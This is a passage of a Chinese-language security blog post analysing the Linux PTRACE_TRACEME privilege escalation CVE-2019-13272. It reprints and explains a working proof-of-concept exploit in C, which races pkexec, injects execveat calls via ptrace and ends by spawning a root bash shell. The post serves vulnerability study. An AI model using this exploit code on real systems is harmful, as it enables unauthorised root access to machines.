class="number">0</span>)</span><br><span class="line"><span class="number">171</span>     <span class="keyword">return</span> spawn_shell();</span><br><span class="line"><span class="number">172</span> </span><br><span class="line"><span class="number">173</span>   helper_path = <span class="string">"/tmp/fakehelper"</span>;</span><br><span class="line"><span class="number">174</span> </span><br><span class="line"><span class="number">175</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">176    * set up a pipe such that the next write to it will block: packet mode,</span></span><br><span class="line"><span class="comment">177    * limited to one packet</span></span><br><span class="line"><span class="comment">178    */</span></span><br><span class="line"><span class="number">179</span>   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));</span><br><span class="line"><span class="number">180</span>   SAFE(fcntl(block_pipe[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>));</span><br><span class="line"><span class="number">181</span>   <span class="keyword">char</span> dummy = <span class="number">0</span>;</span><br><span class="line"><span class="number">182</span>   SAFE(<span class="built_in">write</span>(block_pipe[<span class="number">1</span>], &amp;dummy, <span class="number">1</span>));</span><br><span class="line"><span class="number">183</span> </span><br><span class="line"><span class="number">184</span>   <span class="comment">/* spawn pkexec in a child, and continue here once our child is in execve() */</span></span><br><span class="line"><span class="number">185</span>   <span class="keyword">static</span> <span class="keyword">char</span> middle_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line"><span class="number">186</span>   <span class="keyword">pid_t</span> midpid = SAFE(clone(middle_main, middle_stack+<span class="keyword">sizeof</span>(middle_stack),</span><br><span class="line"><span class="number">187</span>                             CLONE_VM|CLONE_VFORK|SIGCHLD, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">188</span>   <span class="keyword">if</span> (!middle_success) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">189</span> </span><br><span class="line">======================= skip =======================</span><br><span class="line"><span class="number">215</span> &#125;</span><br></pre></td></tr></table></figure>

<p>先看行 186, 调用 clone 生成子进程（也就是 task B）, task B 运行 middle_main </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">64</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_main</span><span class="params">(<span class="keyword">void</span> *dummy)</span> </span>&#123;</span><br><span class="line"> <span class="number">65</span>   prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"> <span class="number">66</span>   <span class="keyword">pid_t</span> middle = getpid();</span><br><span class="line"> <span class="number">67</span> </span><br><span class="line"> <span class="number">68</span>   self_fd = SAFE(<span class="built_in">open</span>(<span class="string">"/proc/self/exe"</span>, O_RDONLY));</span><br><span class="line"> <span class="number">69</span> </span><br><span class="line"> <span class="number">70</span>   <span class="keyword">pid_t</span> child = SAFE(fork());</span><br><span class="line"> <span class="number">71</span>   <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="number">72</span>     prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"> <span class="number">73</span> </span><br><span class="line"> <span class="number">74</span>     SAFE(dup2(self_fd, <span class="number">42</span>));</span><br><span class="line"> <span class="number">75</span> </span><br><span class="line"> <span class="number">76</span>     <span class="comment">/* spin until our parent becomes privileged (have to be fast here) */</span></span><br><span class="line"> <span class="number">77</span>     <span class="keyword">int</span> proc_fd = SAFE(<span class="built_in">open</span>(tprintf(<span class="string">"/proc/%d/status"</span>, middle), O_RDONLY));</span><br><span class="line"> <span class="number">78</span>     <span class="keyword">char</span> *needle = tprintf(<span class="string">"\nUid:\t%d\t0\t"</span>, getuid());</span><br><span class="line"> <span class="number">79</span>     <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="number">80</span>       <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line"> <span class="number">81</span>       <span class="keyword">ssize_t</span> buflen = SAFE(pread(proc_fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>));</span><br><span class="line"> <span class="number">82</span>       buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line"> <span class="number">83</span>       <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, needle)) <span class="keyword">break</span>;</span><br><span class="line"> <span class="number">84</span>     &#125;</span><br><span class="line"> <span class="number">85</span> </span><br><span class="line"> <span class="number">86</span>     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 87      * this is where the bug is triggered.</span></span><br><span class="line"><span class="comment"> 88      * while our parent is in the middle of pkexec, we force it to become our</span></span><br><span class="line"><span class="comment"> 89      * tracer, with pkexec's creds as ptracer_cred.</span></span><br><span class="line"><span class="comment"> 90      */</span></span><br><span class="line"> <span class="number">91</span>     SAFE(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>));</span><br><span class="line"> <span class="number">92</span> </span><br><span class="line"> <span class="number">93</span>     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 94      * now we execute passwd. because the ptrace relationship is considered to</span></span><br><span class="line"><span class="comment"> 95      * be privileged, this is a proper suid execution despite the attached</span></span><br><span class="line"><span class="comment"> 96      * tracer, not a degraded one.</span></span><br><span class="line"><span class="comment"> 97      * at the end of execve(), this process receives a SIGTRAP from ptrace.</span></span><br><span class="line"><span class="comment"> 98      */</span></span><br><span class="line"> <span class="number">99</span>     <span class="built_in">puts</span>(<span class="string">"executing passwd"</span>);</span><br><span class="line"><span class="number">100</span>     execl(<span class="string">"/usr/bin/passwd"</span>, <span class="string">"passwd"</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">101</span>     err(<span class="number">1</span>, <span class="string">"execl passwd"</span>);</span><br><span class="line"><span class="number">102</span>   &#125;</span><br><span class="line"><span class="number">103</span> </span><br><span class="line"><span class="number">104</span>   SAFE(dup2(self_fd, <span class="number">0</span>));</span><br><span class="line"><span class="number">105</span>   SAFE(dup2(block_pipe[<span class="number">1</span>], <span class="number">1</span>));</span><br><span class="line"><span class="number">106</span> </span><br><span class="line"><span class="number">107</span>   <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> = <span class="title">getpwuid</span>(<span class="title">getuid</span>());</span></span><br><span class="line"><span class="number">108</span>   <span class="keyword">if</span> (pw == <span class="literal">NULL</span>) err(<span class="number">1</span>, <span class="string">"getpwuid"</span>);</span><br><span class="line"><span class="number">109</span> </span><br><span class="line"><span class="number">110</span>   middle_success = <span class="number">1</span>;</span><br><span class="line"><span class="number">111</span>   execl(<span class="string">"/tmp/fakepkexec"</span>, <span class="string">"fakepkexec"</span>, <span class="string">"--user"</span>, pw-&gt;pw_name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">112</span>   middle_success = <span class="number">0</span>;</span><br><span class="line"><span class="number">113</span>   err(<span class="number">1</span>, <span class="string">"execl pkexec"</span>);</span><br><span class="line"><span class="number">114</span> &#125;</span><br></pre></td></tr></table></figure>

<p>行 70, 调用 fork 生成孙进程（也就是 task C）</p>
<p>然后行 111, task B 运行 fakepkexec 让自己提权再降权</p>
<p>然后看行 76 ~ 84, task C 检测到 task B 的 euid 变成 0 之后， 会执行行 91 进行 PTRACE_TRACEME 操作获取 root 的 ptracer_cred, 然后紧接着 task C 马上运行 execl 执行一个  suid binary 让自己的 euid 变成 0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">190</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">191    * wait for our child to go through both execve() calls (first pkexec, then</span></span><br><span class="line"><span class="comment">192    * the executable permitted by polkit policy).</span></span><br><span class="line"><span class="comment">193    */</span></span><br><span class="line"><span class="number">194</span>   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">195</span>     <span class="keyword">int</span> fd = <span class="built_in">open</span>(tprintf(<span class="string">"/proc/%d/comm"</span>, midpid), O_RDONLY);</span><br><span class="line"><span class="number">196</span>     <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="number">197</span>     <span class="keyword">int</span> buflen = SAFE(<span class="built_in">read</span>(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>));</span><br><span class="line"><span class="number">198</span>     buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="number">199</span>     *strchrnul(buf, <span class="string">'\n'</span>) = <span class="string">'\0'</span>;</span><br><span class="line"><span class="number">200</span>     <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, basename(helper_path), <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">201</span>       <span class="keyword">break</span>;</span><br><span class="line"><span class="number">202</span>     usleep(<span class="number">100000</span>);</span><br><span class="line"><span class="number">203</span>   &#125;</span><br><span class="line"><span class="number">204</span> </span><br><span class="line"><span class="number">205</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">206    * our child should have gone through both the privileged execve() and the</span></span><br><span class="line"><span class="comment">207    * following execve() here</span></span><br><span class="line"><span class="comment">208    */</span></span><br><span class="line"><span class="number">209</span>   SAFE(ptrace(PTRACE_ATTACH, midpid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">210</span>   SAFE(waitpid(midpid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">211</span>   <span class="built_in">fputs</span>(<span class="string">"attached to midpid\n"</span>, <span class="built_in">stderr</span>);</span><br><span class="line"><span class="number">212</span> </span><br><span class="line"><span class="number">213</span>   force_exec_and_wait(midpid, <span class="number">0</span>, <span class="string">"stage2"</span>);</span><br><span class="line"><span class="number">214</span>   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>接下去回到 task A 的 main 函数， 行 194 ~ 202, task A 检测到 task B 的 binary comm 变成 helper 之后，<br>运行行 213 执行 force_exec_and_wait</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">116</span> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">force_exec_and_wait</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> exec_fd, <span class="keyword">char</span> *arg0)</span> </span>&#123;</span><br><span class="line"><span class="number">117</span>   <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"><span class="number">118</span>   <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span> .iov_base = &amp;regs, .iov_len = <span class="keyword">sizeof</span>(regs) &#125;;</span><br><span class="line"><span class="number">119</span>   SAFE(ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">120</span>   SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">121</span>   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"><span class="number">122</span> </span><br><span class="line"><span class="number">123</span>   <span class="comment">/* set up indirect arguments */</span></span><br><span class="line"><span class="number">124</span>   <span class="keyword">unsigned</span> <span class="keyword">long</span> scratch_area = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL;</span><br><span class="line"><span class="number">125</span>   <span class="class"><span class="keyword">struct</span> <span class="title">injected_page</span> &#123;</span></span><br><span class="line"><span class="number">126</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> argv[<span class="number">2</span>];</span><br><span class="line"><span class="number">127</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> envv[<span class="number">1</span>];</span><br><span class="line"><span class="number">128</span>     <span class="keyword">char</span> arg0[<span class="number">8</span>];</span><br><span class="line"><span class="number">129</span>     <span class="keyword">char</span> path[<span class="number">1</span>];</span><br><span class="line"><span class="number">130</span>   &#125; ipage = &#123;</span><br><span class="line"><span class="number">131</span>     .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125;</span><br><span class="line"><span class="number">132</span>   &#125;;</span><br><span class="line"><span class="number">133</span>   <span class="built_in">strcpy</span>(ipage.arg0, arg0);</span><br><span class="line"><span class="number">134</span>   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(ipage)/<span class="keyword">sizeof</span>(<span class="keyword">long</span>); i++) &#123;</span><br><span class="line"><span class="number">135</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> pdata = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ipage)[i];</span><br><span class="line"><span class="number">136</span>     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line"><span class="number">137</span>                 (<span class="keyword">void</span>*)pdata));</span><br><span class="line"><span class="number">138</span>   &#125;</span><br><span class="line"><span class="number">139</span> </span><br><span class="line"><span class="number">140</span>   <span class="comment">/* execveat(exec_fd, path, argv, envv, flags) */</span></span><br><span class="line"><span class="number">141</span>   regs.orig_rax = __NR_execveat;</span><br><span class="line"><span class="number">142</span>   regs.rdi = exec_fd;</span><br><span class="line"><span class="number">143</span>   regs.rsi = scratch_area + offsetof(struct injected_page, path);</span><br><span class="line"><span class="number">144</span>   regs.rdx = scratch_area + offsetof(struct injected_page, argv);</span><br><span class="line"><span class="number">145</span>   regs.r10 = scratch_area + offsetof(struct injected_page, envv);</span><br><span class="line"><span class="number">146</span>   regs.r8 = AT_EMPTY_PATH;</span><br><span class="line"><span class="number">147</span> </span><br><span class="line"><span class="number">148</span>   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"><span class="number">149</span>   SAFE(ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">150</span>   SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">151</span> &#125;</span><br></pre></td></tr></table></figure>

<p>函数 force_exec_and_wait 的作用是使用 ptrace 控制 tracee 执行 execveat 函数替换进程的镜像, 这里它控制 task B 执行了 task A 的进程（即 exploit 的可执行程序）然后参数为 stage2, 这实际上就是让 task B 执行了 middle_stage2 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">167</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="number">168</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage2"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">169</span>     <span class="keyword">return</span> middle_stage2();</span><br><span class="line"><span class="number">170</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage3"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">171</span>     <span class="keyword">return</span> spawn_shell();</span><br></pre></td></tr></table></figure>

<p>而 middle_stage2 函数同样调用了 force_exec_and_wait , 这将使 task B 利用 ptrace 控制 task C 执行 execveat 函数，将 task C 的镜像也替换为 exploit 的 binary, 且参数是 stage3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">153</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_stage2</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="number">154</span>   <span class="comment">/* our child is hanging in signal delivery from execve()'s SIGTRAP */</span></span><br><span class="line"><span class="number">155</span>   <span class="keyword">pid_t</span> child = SAFE(waitpid(<span class="number">-1</span>, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">156</span>   force_exec_and_wait(child, <span class="number">42</span>, <span class="string">"stage3"</span>);</span><br><span class="line"><span class="number">157</span>   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">158</span> &#125;</span><br></pre></td></tr></table></figure>

<p>当 exploit binary 以参数 stage3 运行时，实际运行的是  spawn_shell 函数, 所以 task C 最后阶段运行的是 spawn_shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">160</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="number">161</span>   SAFE(setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="number">162</span>   SAFE(setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="number">163</span>   execlp(<span class="string">"bash"</span>, <span class="string">"bash"</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">164</span>   err(<span class="number">1</span>, <span class="string">"execlp"</span>);</span><br><span class="line"><span class="number">165</span> &#125;</span><br></pre></td></tr></table></figure>

<p>在 spawn_shell 函数里， 它首先使用 setresgid/setresuid 将本进程的 real uid/effective uid/save uid 都变成 root, 由于 task C 刚刚已经执行了 suid binary 将自身的 euid 变成了 root, 所以这里的 setresuid/setresgid 可以成功执行，到此为止， task C 就变成了一个完全的 root 进程， 最后再执行 execlp 启动一个 shell, 即得到了一个完整 root 权限的 shell</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener"> broken permission and object lifetime handling for PTRACE_TRACEME</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/28/CVE-2019-13272/" data-id="cmd5slr2e000g0lo1adqib5us" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="../../../../2020/07/06/%E7%AA%A5%E6%8E%A2%E6%9C%89%E6%96%B9%E2%80%94%E2%80%94%E8%B0%83%E8%AF%95Released%20SGX%20Enclave/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          窥探有方——调试Released SGX Enclave
        
      </div>
    </a>
  
  
    <a href="../../../03/08/cve-2018-18281/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">TLB 缓存延迟刷新漏洞 CVE-2018-18281 解析</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../../../../2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
            <a href="../../../../2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="../../../../2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
  
    <a href="../../../../research" class="mobile-nav-link">Research</a>
  
    <a href="../../../../vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="../../../../recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="../../../../about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">

  
<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>




<script src="../../../../js/script.js"></script>




  </div>
</body>
</html>